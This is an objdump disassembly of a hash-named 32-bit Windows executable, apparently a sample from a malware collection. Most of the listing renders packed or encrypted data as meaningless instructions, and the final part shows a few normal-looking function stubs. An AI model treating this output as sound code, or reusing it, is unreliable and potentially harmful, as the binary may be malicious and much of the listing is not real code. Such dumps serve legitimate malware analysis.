
e511d956155d0a480b6e25b4a051ada65137101fb6cae9ebc27fd0ac76e84369.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    bl,ch
  4d0002:	and    eax,0xcb2c2066
  4d0007:	in     eax,0x44
  4d0009:	lds    ebx,FWORD PTR [esi]
  4d000b:	jecxz  0x4cff99
  4d000d:	cmc    
  4d000e:	std    
  4d000f:	outs   dx,BYTE PTR ds:[esi]
  4d0010:	add    eax,0xc16858b
  4d0015:	fs enter 0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	adc    edx,DWORD PTR [eax]
  4d06c2:	in     eax,dx
  4d06c3:	add    DWORD PTR [esi+esi*8+0x3df1cf4c],esp
  4d06ca:	lahf   
  4d06cb:	cmp    DWORD PTR ds:0x313e9dc9,esp
  4d06d1:	pop    es
  4d06d2:	test   BYTE PTR [ebp+0x7a],bl
  4d06d5:	fstp   DWORD PTR [edi]
  4d06d7:	and    ah,BYTE PTR [ebx]
  4d06d9:	or     eax,0xbdd991d1
  4d06de:	pop    edi
  4d06df:	mov    ds:0xd713bb9,al
  4d06e4:	fadd   QWORD PTR [edi*4-0x43c59e5d]
  4d06eb:	lds    ebx,FWORD PTR [edi-0x1]
  4d06ee:	adc    eax,0x4d2018
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x58
  4d0700:	mov    ebx,0x4d3050
  4d0705:	and    DWORD PTR [ebp-0x30],0x39
  4d0709:	push   ebx
  4d070a:	push   DWORD PTR [ebx+0x94]
  4d0710:	push   edi
  4d0711:	push   edi
  4d0712:	push   DWORD PTR [ebx+0x8c]
  4d0718:	call   0x4d0a9c
  4d071d:	add    esp,0x10
  4d0720:	pop    ebx
  4d0721:	call   0x4d0dc8
  4d0726:	add    esp,0x4
  4d0729:	mov    eax,0x0
  4d072e:	push   eax
  4d072f:	call   0x4d15a0
  4d0734:	add    esp,0x4
  4d0737:	add    esp,0x58
  4d073a:	pop    ebp
  4d073b:	ret    
  4d073c:	mov    edi,edi
  4d073e:	push   ebp
  4d073f:	mov    ebp,esp
  4d0741:	sub    esp,0x48
  4d0744:	lea    ecx,ds:0x4d3124
  4d074a:	cmp    ecx,0x9d7
  4d0750:	je     0x4d073f
  4d0752:	push   ecx
  4d0753:	push   esi
  4d0754:	push   ebx
  4d0755:	push   esi
  4d0756:	push   edx
  4d0757:	call   0x4d090c
  4d075c:	add    esp,0x10
  4d075f:	pop    ecx
  4d0760:	push   ecx
  4d0761:	push   0x0
  4d0763:	call   0x4d0cc4
  4d0768:	add    esp,0x4
  4d076b:	pop    ecx
  4d076c:	mov    ebx,0x4d2040
  4d0771:	mov    ebx,DWORD PTR [ebx]
  4d0773:	push   ebx
  4d0774:	push   DWORD PTR [ecx-0xe4]
  4d077a:	pop    edx
  4d077b:	call   edx
  4d077d:	add    esp,0x48
  4d0780:	pop    ebp
  4d0781:	ret    
  4d0782:	add    BYTE PTR [eax],al
  4d0784:	mov    edi,edi
  4d0786:	push   ebp
  4d0787:	mov    ebp,esp
  4d0789:	sub    esp,0x24
  4d078c:	mov    ecx,0x4d3088
  4d0791:	mov    edx,DWORD PTR [ecx+0x114]
